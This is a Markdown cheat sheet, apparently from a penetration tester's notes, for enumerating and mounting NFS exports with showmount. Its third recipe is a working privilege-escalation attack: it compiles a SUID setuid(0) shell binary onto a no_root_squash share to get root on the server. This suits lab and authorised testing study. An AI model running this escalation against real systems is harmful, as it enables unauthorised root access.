# showmount — list NFS exports

> **Step 1 of NFS enumeration.** Queries `mountd` on TCP/UDP 111 + 2049 for exported shares and current mounts.

**Install check:** `showmount --version` (nfs-common)

---

## 🎯 Cheat-flow

```bash
showmount -e 10.10.10.5            # list exports (most used)
showmount -a 10.10.10.5            # all current client mounts
showmount -d 10.10.10.5            # list directories currently mounted
showmount --no-headers -e target   # machine-friendly
```

---

## 🔑 Flags

| Flag | Meaning |
|---|---|
| `-e` | Show **exports** list |
| `-a` | Show all mounts (host:dir pairs) |
| `-d` | Directories mounted by at least one client |
| `--no-headers` | Omit column headers |

---

## 📋 Recipes

```bash
# 1. Enumerate and mount an open export
showmount -e 10.10.10.5
# Export list for 10.10.10.5:
# /srv/share *
# /home      10.10.10.0/24

sudo mkdir -p /mnt/nfs
sudo mount -t nfs 10.10.10.5:/srv/share /mnt/nfs
ls /mnt/nfs

# 2. Fully mount and preserve permissions (watch for no_root_squash)
sudo mount -o vers=3 10.10.10.5:/srv/share /mnt/nfs

# 3. no_root_squash privesc — if root on client maps to root on server, drop a SUID binary
echo 'int main(){setuid(0);system("/bin/sh");}' > /tmp/r.c
gcc /tmp/r.c -o /mnt/nfs/r
chmod +s /mnt/nfs/r
# then on the target box (as normal user):
# /srv/share/r  → root shell
```

---

## ⚠️ Gotchas

- If showmount returns `clnt_create: RPC: Program not registered`, mountd isn't running / not exposed — try `nmap -p 2049 --script nfs-showmount`.
- Modern NFSv4 can work **without mountd** on port 2049 only. `showmount -e` may fail even though `mount -t nfs4` works.
- `*` in an export means world-accessible — mount it.
- Always check for `no_root_squash` option — that's the privesc trick.

---

## 🔗 Related

- [nmap](nmap.md) (`--script nfs-*`) · [smbclient](smbclient.md)
